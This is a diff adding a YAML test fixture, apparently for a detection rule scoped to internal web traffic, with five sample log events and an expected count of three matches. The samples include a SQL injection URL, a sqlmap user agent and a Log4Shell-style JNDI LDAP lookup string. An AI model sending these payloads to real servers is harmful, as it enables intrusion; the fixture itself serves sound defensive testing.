@@ -1,0 +1,49 @@
+docs:
+- id: sqli
+  match: true
+  doc:
+    event: {category: web}
+    host: {name: web1}
+    http: {request: {method: GET}, response: {status_code: 200}}
+    source: {ip: 10.1.2.3}
+    user_agent:
+      original: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36
+    url: {original: '/item?id=1+union+select+1,2,3'}
+- id: ua
+  match: true
+  doc:
+    event: {category: web}
+    host: {name: web1}
+    http: {request: {method: GET}, response: {status_code: 200}}
+    source: {ip: 192.168.4.4}
+    user_agent: {original: 'sqlmap/1.8.2#stable (https://sqlmap.org)'}
+    url: {original: /}
+- id: jndi-404
+  match: true
+  doc:
+    event: {category: web}
+    host: {name: web1}
+    http: {request: {method: GET}, response: {status_code: 404}}
+    source: {ip: 10.9.9.9}
+    user_agent:
+      original: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36
+    url: {original: '/${jndi:ldap://10.9.9.8/a}'}
+- id: external
+  doc:
+    source: {ip: 198.51.100.9}
+    url: {original: '/item?id=1+union+select+1,2,3'}
+    event: {category: web}
+    host: {name: web1}
+    http: {request: {method: GET}, response: {status_code: 200}}
+    user_agent:
+      original: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36
+- id: internal-normal
+  doc:
+    source: {ip: 10.1.2.3}
+    url: {original: '/search?q=union+of+sets'}
+    event: {category: web}
+    host: {name: web1}
+    http: {request: {method: GET}, response: {status_code: 200}}
+    user_agent:
+      original: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36
+matches: 3
